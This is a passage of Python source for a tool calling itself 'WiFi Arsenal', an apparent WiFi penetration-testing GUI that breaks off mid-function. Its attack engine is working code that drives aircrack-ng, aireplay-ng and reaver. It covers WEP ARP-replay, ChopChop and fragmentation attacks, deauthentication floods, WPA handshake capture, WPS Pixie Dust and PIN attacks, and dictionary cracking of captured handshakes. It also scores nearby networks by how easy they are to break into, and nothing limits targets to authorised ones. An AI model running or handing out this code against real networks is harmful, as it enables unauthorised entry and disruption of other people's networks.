
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Arsenal - Advanced WiFi Security Auditing Platform
Developed by 0x0806
The ultimate all-in-one WiFi penetration testing toolkit
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import subprocess
import time
import os
import json
import re
import csv
from datetime import datetime
import sqlite3
from pathlib import Path
import hashlib
import queue
import webbrowser
from typing import Dict, List, Optional, Tuple, Union
import sys
import socket
import struct
import binascii
from collections import defaultdict
import signal
import psutil

# Advanced Arsenal Color Scheme
ARSENAL_COLORS = {
    'bg_primary': '#0D1117',      # Deep dark background
    'bg_secondary': '#161B22',     # Secondary dark
    'bg_tertiary': '#21262D',      # Tertiary background
    'accent_primary': '#FF6B35',   # Arsenal orange
    'accent_secondary': '#00D9FF', # Electric blue
    'success': '#40C463',          # Success green
    'warning': '#F85149',          # Warning red
    'info': '#58A6FF',            # Info blue
    'text_primary': '#F0F6FC',     # Primary text
    'text_secondary': '#8B949E',   # Secondary text
    'border': '#30363D',           # Border color
    'highlight': '#BB86FC'         # Purple highlight
}

class ArsenalDatabase:
    """Advanced database manager with encryption and analytics"""
    
    def __init__(self, db_path: str = "wifi_arsenal.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize advanced database schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Networks table with advanced fields
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS networks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                bssid TEXT UNIQUE,
                essid TEXT,
                channel INTEGER,
                frequency INTEGER,
                encryption TEXT,
                cipher TEXT,
                authentication TEXT,
                power INTEGER,
                quality INTEGER,
                max_rate INTEGER,
                cc TEXT,
                privacy TEXT,
                wps_enabled BOOLEAN,
                wps_version TEXT,
                wps_locked BOOLEAN,
                vendor TEXT,
                vulnerability_score INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                beacon_count INTEGER,
                data_count INTEGER,
                notes TEXT
            )
        ''')
        
        # Clients table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                client_mac TEXT,
                bssid TEXT,
                power INTEGER,
                packets INTEGER,
                probe_essids TEXT,
                vendor TEXT,
                first_seen TEXT,
                last_seen TEXT
            )
        ''')
        
        # Attacks table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target_bssid TEXT,
                target_essid TEXT,
                attack_type TEXT,
                status TEXT,
                duration INTEGER,
                success BOOLEAN,
                password TEXT,
                pin TEXT,
                handshake_file TEXT,
                wordlist_used TEXT,
                notes TEXT
            )
        ''')
        
        # Handshakes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS handshakes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                bssid TEXT,
                essid TEXT,
                file_path TEXT,
                file_hash TEXT,
                validation_status TEXT,
                cracked BOOLEAN,
                password TEXT,
                crack_time INTEGER
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_network(self, data: Dict):
        """Save or update network data"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO networks 
            (timestamp, bssid, essid, channel, frequency, encryption, cipher, 
             authentication, power, quality, max_rate, cc, privacy, wps_enabled, 
             wps_version, wps_locked, vendor, vulnerability_score, first_seen, 
             last_seen, beacon_count, data_count, notes)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            data.get('bssid', ''),
            data.get('essid', ''),
            data.get('channel', 0),
            data.get('frequency', 0),
            data.get('encryption', ''),
            data.get('cipher', ''),
            data.get('authentication', ''),
            data.get('power', 0),
            data.get('quality', 0),
            data.get('max_rate', 0),
            data.get('cc', ''),
            data.get('privacy', ''),
            data.get('wps_enabled', False),
            data.get('wps_version', ''),
            data.get('wps_locked', False),
            data.get('vendor', ''),
            data.get('vulnerability_score', 0),
            data.get('first_seen', datetime.now().isoformat()),
            data.get('last_seen', datetime.now().isoformat()),
            data.get('beacon_count', 0),
            data.get('data_count', 0),
            data.get('notes', '')
        ))
        
        conn.commit()
        conn.close()
    
    def save_attack_result(self, data: Dict):
        """Save attack result"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attacks 
            (timestamp, target_bssid, target_essid, attack_type, status, duration, 
             success, password, pin, handshake_file, wordlist_used, notes)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            data.get('target_bssid', ''),
            data.get('target_essid', ''),
            data.get('attack_type', ''),
            data.get('status', ''),
            data.get('duration', 0),
            data.get('success', False),
            data.get('password', ''),
            data.get('pin', ''),
            data.get('handshake_file', ''),
            data.get('wordlist_used', ''),
            data.get('notes', '')
        ))
        
        conn.commit()
        conn.close()
    
    def get_all_networks(self):
        """Get all networks from database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM networks ORDER BY last_seen DESC')
        networks = cursor.fetchall()
        
        conn.close()
        return networks
    
    def get_attack_history(self, bssid=None):
        """Get attack history"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        if bssid:
            cursor.execute('SELECT * FROM attacks WHERE target_bssid = ? ORDER BY timestamp DESC', (bssid,))
        else:
            cursor.execute('SELECT * FROM attacks ORDER BY timestamp DESC')
        
        attacks = cursor.fetchall()
        conn.close()
        return attacks

class WiFiTarget:
    """Enhanced WiFi target with advanced analysis"""
    
    def __init__(self, bssid: str, essid: str = "", channel: int = 0, 
                 encryption: str = "", power: int = 0, wps: bool = False):
        self.bssid = bssid.upper()
        self.essid = essid or "Hidden Network"
        self.channel = channel
        self.frequency = self.channel_to_frequency(channel)
        self.encryption = encryption
        self.power = power
        self.wps = wps
        self.wps_locked = False
        self.wps_version = ""
        self.clients = []
        self.vendor = self.get_vendor_from_mac(bssid)
        self.handshake_captured = False
        self.vulnerability_score = self.calculate_vulnerability_score()
        self.attack_history = []
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.beacon_count = 0
        self.data_count = 0
        self.quality = 0
        self.max_rate = 0
        self.cipher = ""
        self.authentication = ""
        self.cc = ""
        self.privacy = ""
    
    def channel_to_frequency(self, channel: int) -> int:
        """Convert channel to frequency in MHz"""
        if 1 <= channel <= 13:
            return 2412 + (channel - 1) * 5
        elif channel == 14:
            return 2484
        elif 36 <= channel <= 165:
            return 5000 + channel * 5
        return 0
    
    def get_vendor_from_mac(self, mac: str) -> str:
        """Get vendor from MAC address OUI"""
        oui_map = {
            '00:1B:63': 'Apple',
            '00:25:00': 'Apple',
            '00:26:BB': 'Apple',
            '00:1F:5B': 'Apple',
            '00:50:56': 'VMware',
            '00:0C:29': 'VMware',
            '08:00:27': 'VirtualBox',
            '00:16:3E': 'Xen',
            '00:1C:42': 'Parallels',
            '00:A0:C9': 'Intel',
            '00:E0:4C': 'Realtek',
            '00:90:4C': 'Epigram',
            'AC:BC:32': 'Apple',
            '28:CF:E9': 'Apple',
            '00:23:DF': 'Apple',
            'D8:A2:5E': 'Netgear',
            'C0:56:27': 'Belkin',
            '00:1A:2B': 'Cisco',
            '00:22:6B': 'Cisco',
            'F8:1A:67': 'TP-Link',
            'EC:08:6B': 'TP-Link',
            '20:4E:7F': 'D-Link',
            '24:01:C7': 'D-Link'
        }
        
        oui = mac[:8].upper()
        return oui_map.get(oui, 'Unknown')
    
    def calculate_vulnerability_score(self) -> int:
        """Advanced vulnerability scoring algorithm"""
        score = 0
        
        # Encryption scoring
        if 'WEP' in self.encryption:
            score += 95  # WEP is critically vulnerable
        elif 'WPA3' in self.encryption:
            score += 5   # WPA3 is most secure
        elif 'WPA2' in self.encryption and 'WPA3' not in self.encryption:
            score += 30  # WPA2 is moderately secure
        elif 'WPA' in self.encryption and 'WPA2' not in self.encryption:
            score += 70  # WPA is vulnerable
        elif 'Open' in self.encryption or self.encryption == '':
            score += 100 # Open networks are completely vulnerable
        
        # WPS vulnerability
        if self.wps and not self.wps_locked:
            score += 40  # Unlocked WPS adds significant vulnerability
        elif self.wps and self.wps_locked:
            score += 15  # Even locked WPS can be vulnerable
        
        # Signal strength factor
        if self.power > -50:
            score += 15  # Strong signal makes attacks easier
        elif self.power > -70:
            score += 10
        elif self.power > -80:
            score += 5
        
        # Default password patterns
        if self.essid:
            default_patterns = ['linksys', 'netgear', 'dlink', 'default', 'admin', 'password']
            if any(pattern in self.essid.lower() for pattern in default_patterns):
                score += 20
        
        # Client factor
        if len(self.clients) > 0:
            score += min(len(self.clients) * 5, 25)  # More clients = easier handshake capture
        
        return min(score, 100)
    
    def get_risk_level(self) -> str:
        """Get risk level based on vulnerability score"""
        if self.vulnerability_score >= 80:
            return "CRITICAL"
        elif self.vulnerability_score >= 60:
            return "HIGH"
        elif self.vulnerability_score >= 40:
            return "MEDIUM"
        elif self.vulnerability_score >= 20:
            return "LOW"
        else:
            return "MINIMAL"
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'frequency': self.frequency,
            'encryption': self.encryption,
            'power': self.power,
            'wps_enabled': self.wps,
            'wps_locked': self.wps_locked,
            'vendor': self.vendor,
            'vulnerability_score': self.vulnerability_score,
            'risk_level': self.get_risk_level(),
            'clients': len(self.clients),
            'handshake_captured': self.handshake_captured
        }

class ArsenalNetworkInterface:
    """Advanced network interface management"""
    
    @staticmethod
    def get_interfaces() -> List[Dict]:
        """Get detailed interface information"""
        interfaces = []
        try:
            # Get wireless interfaces using iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        interface_name = line.split()[0]
                        interfaces.append({
                            'name': interface_name,
                            'type': 'wireless',
                            'standard': '802.11',
                            'mode': 'managed',
                            'monitor_capable': True,
                            'mac': ArsenalNetworkInterface._get_mac_address(interface_name),
                            'driver': ArsenalNetworkInterface._get_driver(interface_name)
                        })
            
            return interfaces
        except Exception as e:
            raise Exception(f"Error getting interfaces: {e}")
    
    @staticmethod
    def _get_mac_address(interface: str) -> str:
        """Get MAC address of interface"""
        try:
            with open(f'/sys/class/net/{interface}/address', 'r') as f:
                return f.read().strip()
        except:
            return 'Unknown'
    
    @staticmethod
    def _get_driver(interface: str) -> str:
        """Get driver of interface"""
        try:
            driver_path = f'/sys/class/net/{interface}/device/driver'
            if os.path.islink(driver_path):
                return os.path.basename(os.readlink(driver_path))
            return 'Unknown'
        except:
            return 'Unknown'
    
    @staticmethod
    def enable_monitor_mode(interface: str) -> Tuple[bool, str]:
        """Enable monitor mode with error handling"""
        try:
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=30)
            
            # Enable monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Find monitor interface name
                for line in result.stdout.split('\n'):
                    if 'monitor mode enabled' in line.lower():
                        monitor_interface = line.split()[-1].rstrip('])')
                        return True, monitor_interface
                return True, f"{interface}mon"
            else:
                return False, result.stderr
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def disable_monitor_mode(interface: str) -> bool:
        """Disable monitor mode"""
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', interface], 
                         capture_output=True, timeout=30)
            return True
        except Exception as e:
            print(f"Error disabling monitor mode: {e}")
            return False

class ArsenalScanner:
    """Advanced WiFi scanner with real-time analysis"""
    
    def __init__(self, interface: str, callback=None):
        self.interface = interface
        self.callback = callback
        self.targets = {}
        self.clients = {}
        self.scanning = False
        self.scan_process = None
        self.scan_start_time = None
        self.packets_captured = 0
        self.channels_scanned = set()
        self.output_file = None
    
    def start_scan(self, channel: Optional[int] = None, scan_type: str = "active"):
        """Start advanced WiFi scanning"""
        if self.scanning:
            return False
        
        self.scanning = True
        self.scan_start_time = time.time()
        self.packets_captured = 0
        self.channels_scanned.clear()
        
        threading.Thread(target=self._scan_worker, args=(channel, scan_type), daemon=True).start()
        return True
    
    def stop_scan(self):
        """Stop WiFi scanning"""
        self.scanning = False
        if self.scan_process:
            try:
                self.scan_process.terminate()
                self.scan_process.wait(timeout=5)
            except:
                try:
                    self.scan_process.kill()
                except:
                    pass
    
    def _scan_worker(self, channel: Optional[int] = None, scan_type: str = "active"):
        """Advanced scanning worker"""
        try:
            self._real_scan(channel, scan_type)
        except Exception as e:
            print(f"Scan error: {e}")
    
    def _real_scan(self, channel: Optional[int] = None, scan_type: str = "active"):
        """Real scanning with airodump-ng"""
        try:
            # Create output file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.output_file = f"/tmp/arsenal_scan_{timestamp}"
            
            # Prepare scan command
            cmd = ['sudo', 'airodump-ng', '--write-interval', '2', 
                   '--output-format', 'csv', '--write', self.output_file]
            
            if channel:
                cmd.extend(['-c', str(channel)])
            else:
                # Scan all channels
                cmd.extend(['-c', '1-14,36-165'])
            
            cmd.append(self.interface)
            
            self.scan_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                               stderr=subprocess.PIPE)
            
            # Monitoring loop
            while self.scanning:
                time.sleep(3)
                self._parse_scan_results()
                
        except Exception as e:
            raise Exception(f"Real scan error: {e}")
        finally:
            if self.scan_process:
                try:
                    self.scan_process.terminate()
                except:
                    pass
    
    def _parse_scan_results(self):
        """Parse airodump CSV results with enhanced processing"""
        try:
            csv_file = f'{self.output_file}-01.csv'
            if not os.path.exists(csv_file):
                return
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = content.split('\n')
            parsing_targets = True
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                if 'Station MAC' in line:
                    parsing_targets = False
                    continue
                
                if parsing_targets and ',' in line:
                    self._parse_target_line(line)
                elif not parsing_targets and ',' in line:
                    self._parse_client_line(line)
            
            # Callback with updated data
            if self.callback:
                self.callback(list(self.targets.values()), list(self.clients.values()))
                
        except Exception as e:
            print(f"Parse error: {e}")
    
    def _parse_target_line(self, line: str):
        """Parse target (AP) line from CSV"""
        try:
            fields = [field.strip() for field in line.split(',')]
            if len(fields) < 14:
                return
            
            bssid = fields[0]
            if not bssid or not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
                return
            
            essid = fields[13] if len(fields) > 13 and fields[13] else "Hidden Network"
            channel = int(fields[3]) if fields[3].isdigit() else 0
            encryption = f"{fields[5]} {fields[6]}".strip() if len(fields) > 6 else ""
            power = int(fields[8]) if fields[8].lstrip('-').isdigit() else -100
            
            # Create or update target
            if bssid not in self.targets:
                target = WiFiTarget(bssid, essid, channel, encryption, power)
                target.beacon_count = int(fields[9]) if len(fields) > 9 and fields[9].isdigit() else 0
                target.data_count = int(fields[10]) if len(fields) > 10 and fields[10].isdigit() else 0
                self.targets[bssid] = target
            else:
                # Update existing target
                target = self.targets[bssid]
                target.last_seen = datetime.now()
                target.power = power
                if essid != "Hidden Network":
                    target.essid = essid
            
            self.channels_scanned.add(channel)
            
        except (ValueError, IndexError) as e:
            pass
    
    def _parse_client_line(self, line: str):
        """Parse client line from CSV"""
        try:
            fields = [field.strip() for field in line.split(',')]
            if len(fields) < 6:
                return
            
            client_mac = fields[0]
            bssid = fields[5] if len(fields) > 5 else ""
            power = int(fields[3]) if len(fields) > 3 and fields[3].lstrip('-').isdigit() else -100
            packets = int(fields[4]) if len(fields) > 4 and fields[4].isdigit() else 0
            
            if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', client_mac):
                return
            
            # Store client info
            client_key = f"{client_mac}_{bssid}"
            self.clients[client_key] = {
                'mac': client_mac,
                'bssid': bssid,
                'power': power,
                'packets': packets,
                'last_seen': datetime.now()
            }
            
            # Associate client with target
            if bssid in self.targets:
                if client_mac not in [c['mac'] for c in self.targets[bssid].clients]:
                    self.targets[bssid].clients.append({
                        'mac': client_mac,
                        'power': power,
                        'packets': packets
                    })
                    
        except (ValueError, IndexError):
            pass

class ArsenalAttackEngine:
    """Advanced attack engine with multiple attack vectors"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.current_attack = None
        self.attack_results = {}
        self.attack_statistics = defaultdict(int)
        self.attack_processes = []
    
    def attack_wep(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """Advanced WEP attack with multiple methods"""
        attack_id = f"wep_{target.bssid}_{int(time.time())}"
        start_time = time.time()
        
        try:
            if progress_callback:
                progress_callback("Initializing WEP attack suite...")
            
            # Method 1: Fake Authentication + ARP Replay
            result = self._wep_arp_replay_attack(target, progress_callback)
            if result['success']:
                return self._finalize_attack_result(attack_id, target, result, start_time)
            
            # Method 2: Chop-Chop Attack
            if progress_callback:
                progress_callback("Attempting ChopChop attack...")
            result = self._wep_chopchop_attack(target, progress_callback)
            if result['success']:
                return self._finalize_attack_result(attack_id, target, result, start_time)
            
            # Method 3: Fragmentation Attack
            if progress_callback:
                progress_callback("Attempting Fragmentation attack...")
            result = self._wep_fragmentation_attack(target, progress_callback)
            if result['success']:
                return self._finalize_attack_result(attack_id, target, result, start_time)
            
            return self._finalize_attack_result(attack_id, target, {'success': False, 'error': 'All WEP attacks failed'}, start_time)
            
        except Exception as e:
            return self._finalize_attack_result(attack_id, target, {'success': False, 'error': str(e)}, start_time)
    
    def _wep_arp_replay_attack(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """ARP replay attack for WEP"""
        try:
            if progress_callback:
                progress_callback("Performing fake authentication...")
            
            # Get interface MAC
            interface_mac = self._get_interface_mac()
            
            # Fake authentication
            auth_cmd = ['sudo', 'aireplay-ng', '-1', '0', '-a', target.bssid, 
                       '-h', interface_mac, self.interface]
            auth_result = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=60)
            
            if 'successful' not in auth_result.stdout.lower():
                return {'success': False, 'error': 'Fake authentication failed'}
            
            if progress_callback:
                progress_callback("Starting ARP replay attack...")
            
            # Start capture
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            cap_file = f"/tmp/arsenal_wep_{target.bssid.replace(':', '')}_{timestamp}"
            
            dump_cmd = ['sudo', 'airodump-ng', '-c', str(target.channel), 
                       '--bssid', target.bssid, '--write', cap_file, self.interface]
            dump_process = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(3)
            
            # Start ARP replay
            replay_cmd = ['sudo', 'aireplay-ng', '-3', '-b', target.bssid, 
                         '-h', interface_mac, self.interface]
            replay_process = subprocess.Popen(replay_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for IVs to accumulate
            time.sleep(45)
            
            if progress_callback:
                progress_callback("Attempting to crack WEP key...")
            
            # Stop processes
            replay_process.terminate()
            dump_process.terminate()
            
            # Try cracking with accumulated IVs
            crack_cmd = ['sudo', 'aircrack-ng', '-b', target.bssid, f"{cap_file}-01.cap"]
            
            crack_result = subprocess.run(crack_cmd, capture_output=True, text=True, timeout=300)
            
            if 'KEY FOUND' in crack_result.stdout:
                key_match = re.search(r'KEY FOUND! \[ (.+) \]', crack_result.stdout)
                if key_match:
                    return {'success': True, 'key': key_match.group(1), 'method': 'ARP Replay'}
            
            return {'success': False, 'error': 'Key not found with ARP replay'}
            
        except Exception as e:
            return {'success': False, 'error': f'ARP replay failed: {str(e)}'}
    
    def _wep_chopchop_attack(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """ChopChop attack for WEP"""
        try:
            if progress_callback:
                progress_callback("Executing ChopChop attack...")
            
            # ChopChop attack
            chopchop_cmd = ['sudo', 'aireplay-ng', '-4', '-b', target.bssid, 
                           '-h', self._get_interface_mac(), self.interface]
            
            chopchop_result = subprocess.run(chopchop_cmd, capture_output=True, text=True, timeout=300)
            
            if 'packet decrypted' in chopchop_result.stdout.lower():
                return {'success': True, 'method': 'ChopChop'}
            
            return {'success': False, 'error': 'ChopChop attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'ChopChop failed: {str(e)}'}
    
    def _wep_fragmentation_attack(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """Fragmentation attack for WEP"""
        try:
            if progress_callback:
                progress_callback("Executing Fragmentation attack...")
            
            # Fragmentation attack
            frag_cmd = ['sudo', 'aireplay-ng', '-5', '-b', target.bssid, 
                       '-h', self._get_interface_mac(), self.interface]
            
            frag_result = subprocess.run(frag_cmd, capture_output=True, text=True, timeout=300)
            
            if 'obtained' in frag_result.stdout.lower():
                return {'success': True, 'method': 'Fragmentation'}
            
            return {'success': False, 'error': 'Fragmentation attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'Fragmentation failed: {str(e)}'}
    
    def attack_wpa_handshake(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """Advanced WPA handshake capture with optimization"""
        attack_id = f"wpa_{target.bssid}_{int(time.time())}"
        start_time = time.time()
        
        try:
            if progress_callback:
                progress_callback("Optimizing handshake capture strategy...")
            
            # Create capture file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            cap_file = f"/tmp/arsenal_handshake_{target.bssid.replace(':', '')}_{timestamp}"
            
            # Start targeted capture
            dump_cmd = ['sudo', 'airodump-ng', '-c', str(target.channel), 
                       '--bssid', target.bssid, '--write', cap_file, self.interface]
            dump_process = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(5)
            
            if progress_callback:
                progress_callback("Sending optimized deauth packets...")
            
            # Strategic deauth attacks
            if target.clients:
                # Target specific clients
                for client in target.clients[:3]:  # Limit to 3 clients
                    deauth_cmd = ['sudo', 'aireplay-ng', '-0', '5', '-a', target.bssid, 
                                 '-c', client['mac'], self.interface]
                    subprocess.run(deauth_cmd, timeout=15)
                    time.sleep(2)
            else:
                # Broadcast deauth
                deauth_cmd = ['sudo', 'aireplay-ng', '-0', '10', '-a', target.bssid, self.interface]
                subprocess.run(deauth_cmd, timeout=30)
            
            if progress_callback:
                progress_callback("Analyzing captured handshake...")
            
            time.sleep(15)
            dump_process.terminate()
            
            # Verify handshake
            cap_file_with_ext = f"{cap_file}-01.cap"
            if os.path.exists(cap_file_with_ext):
                verification = self._verify_handshake(cap_file_with_ext, target.bssid)
                if verification['valid']:
                    target.handshake_captured = True
                    return self._finalize_attack_result(attack_id, target, {
                        'success': True, 
                        'handshake_file': cap_file_with_ext,
                        'verification': verification
                    }, start_time)
            
            return self._finalize_attack_result(attack_id, target, {
                'success': False, 
                'error': 'Handshake not captured or invalid'
            }, start_time)
            
        except Exception as e:
            return self._finalize_attack_result(attack_id, target, {
                'success': False, 
                'error': str(e)
            }, start_time)
    
    def attack_wps_advanced(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """Advanced WPS attack with multiple methods"""
        attack_id = f"wps_{target.bssid}_{int(time.time())}"
        start_time = time.time()
        
        try:
            if progress_callback:
                progress_callback("Initializing advanced WPS attack...")
            
            # Method 1: Pixie Dust
            result = self._wps_pixie_dust(target, progress_callback)
            if result['success']:
                return self._finalize_attack_result(attack_id, target, result, start_time)
            
            # Method 2: PIN Bruteforce (if not locked)
            if not target.wps_locked:
                result = self._wps_pin_attack(target, progress_callback)
                if result['success']:
                    return self._finalize_attack_result(attack_id, target, result, start_time)
            
            # Method 3: NULL PIN
            result = self._wps_null_pin(target, progress_callback)
            if result['success']:
                return self._finalize_attack_result(attack_id, target, result, start_time)
            
            return self._finalize_attack_result(attack_id, target, {
                'success': False, 
                'error': 'All WPS attacks failed'
            }, start_time)
            
        except Exception as e:
            return self._finalize_attack_result(attack_id, target, {
                'success': False, 
                'error': str(e)
            }, start_time)
    
    def _wps_pixie_dust(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """WPS Pixie Dust attack"""
        try:
            if progress_callback:
                progress_callback("Executing Pixie Dust attack...")
            
            reaver_cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid, 
                         '-K', '1', '-vv', '-c', str(target.channel)]
            
            result = subprocess.run(reaver_cmd, capture_output=True, text=True, timeout=180)
            
            # Parse results
            pin_match = re.search(r'WPS PIN: (\d+)', result.stdout)
            psk_match = re.search(r'WPA PSK: (.+)', result.stdout)
            
            if pin_match and psk_match:
                return {
                    'success': True,
                    'method': 'Pixie Dust',
                    'pin': pin_match.group(1),
                    'key': psk_match.group(1).strip()
                }
            
            return {'success': False, 'error': 'Pixie Dust attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'Pixie Dust failed: {str(e)}'}
    
    def _wps_pin_attack(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """WPS PIN bruteforce attack"""
        try:
            if progress_callback:
                progress_callback("Attempting WPS PIN attack...")
            
            # Common PINs to try first
            common_pins = ['12345670', '00000000', '11111111', '22222222', '12345678']
            
            for pin in common_pins:
                if progress_callback:
                    progress_callback(f"Trying PIN: {pin}")
                
                reaver_cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid, 
                             '-p', pin, '-vv', '-c', str(target.channel)]
                
                result = subprocess.run(reaver_cmd, capture_output=True, text=True, timeout=60)
                
                if 'WPA PSK:' in result.stdout:
                    psk_match = re.search(r'WPA PSK: (.+)', result.stdout)
                    if psk_match:
                        return {
                            'success': True,
                            'method': 'PIN Attack',
                            'pin': pin,
                            'key': psk_match.group(1).strip()
                        }
            
            return {'success': False, 'error': 'PIN attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'PIN attack failed: {str(e)}'}
    
    def _wps_null_pin(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """WPS NULL PIN attack"""
        try:
            if progress_callback:
                progress_callback("Attempting NULL PIN attack...")
            
            reaver_cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid, 
                         '-p', '', '-vv', '-c', str(target.channel)]
            
            result = subprocess.run(reaver_cmd, capture_output=True, text=True, timeout=60)
            
            if 'WPA PSK:' in result.stdout:
                psk_match = re.search(r'WPA PSK: (.+)', result.stdout)
                if psk_match:
                    return {
                        'success': True,
                        'method': 'NULL PIN',
                        'pin': 'NULL',
                        'key': psk_match.group(1).strip()
                    }
            
            return {'success': False, 'error': 'NULL PIN attack failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'NULL PIN failed: {str(e)}'}
    
    def crack_handshake_dictionary(self, handshake_file: str, wordlist_file: str, 
                                  target: WiFiTarget, progress_callback=None) -> Dict:
        """Advanced dictionary attack on handshake"""
        attack_id = f"dict_{target.bssid}_{int(time.time())}"
        start_time = time.time()
        
        try:
            if progress_callback:
                progress_callback("Initializing dictionary attack...")
            
            # Use aircrack-ng for dictionary attack
            crack_cmd = ['sudo', 'aircrack-ng', '-w', wordlist_file, '-b', target.bssid, handshake_file]
            
            if progress_callback:
                progress_callback("Running dictionary attack (this may take a while)...")
            
            result = subprocess.run(crack_cmd, capture_output=True, text=True, timeout=3600)
            
            if 'KEY FOUND' in result.stdout:
                key_match = re.search(r'KEY FOUND! \[ (.+) \]', result.stdout)
                if key_match:
                    return self._finalize_attack_result(attack_id, target, {
                        'success': True,
                        'method': 'Dictionary',
                        'key': key_match.group(1),
                        'wordlist': wordlist_file
                    }, start_time)
            
            return self._finalize_attack_result(attack_id, target, {
                'success': False,
                'error': 'Password not found in wordlist'
            }, start_time)
            
        except Exception as e:
            return self._finalize_attack_result(attack_id, target, {
                'success': False,
                'error': str(e)
            }, start_time)
    
    def attack_deauth(self, target: WiFiTarget, progress_callback=None) -> Dict:
        """Deauth attack"""
        attack_id = f"deauth_{target.bssid}_{int(time.time())}"
        start_time = time.time()
        
        try:
            if progress_callback:
                progress_callback("Launching deauth attack...")
            
            # Deauth all clients
            deauth_cmd = ['sudo', 'aireplay-ng', '-0', '50', '-a', target.bssid, self.interface]
            result = subprocess.run(deauth_cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                return self._finalize_attack_result(attack_id, target, {
                    'success': True,
                    'method': 'Deauth',
                    'packets_sent': 50
                }, start_time)
            
            return self._finalize_attack_result(attack_id, target, {
                'success': False,
                'error': 'Deauth attack failed'
            }, start_time)
            
        except Exception as e:
            return self._finalize_attack_result(attack_id, target, {
                'success': False,
                'error': str(e)
            }, start_time)
    
    def _verify_handshake(self, cap_file: str, bssid: str) -> Dict:
        """Verify handshake validity using multiple tools"""
        verification = {'valid': False, 'tools': {}}
        
        # Try aircrack-ng
        try:
            result = subprocess.run(['aircrack-ng', cap_file], capture_output=True, text=True, timeout=30)
            verification['tools']['aircrack'] = 'handshake' in result.stdout.lower()
        except:
            verification['tools']['aircrack'] = False
        
        # Try tshark if available
        try:
            result = subprocess.run(['tshark', '-r', cap_file, '-Y', 'eapol'], 
                                  capture_output=True, text=True, timeout=30)
            verification['tools']['tshark'] = bool(result.stdout.strip())
        except:
            verification['tools']['tshark'] = False
        
        # Handshake is valid if at least one tool confirms it
        verification['valid'] = any(verification['tools'].values())
        
        return verification
    
    def _get_interface_mac(self) -> str:
        """Get MAC address of interface"""
        try:
            result = subprocess.run(['cat', f'/sys/class/net/{self.interface}/address'], 
                                  capture_output=True, text=True, timeout=5)
            return result.stdout.strip()
        except:
            raise Exception("Could not get interface MAC address")
    
    def _finalize_attack_result(self, attack_id: str, target: WiFiTarget, 
                               result: Dict, start_time: float) -> Dict:
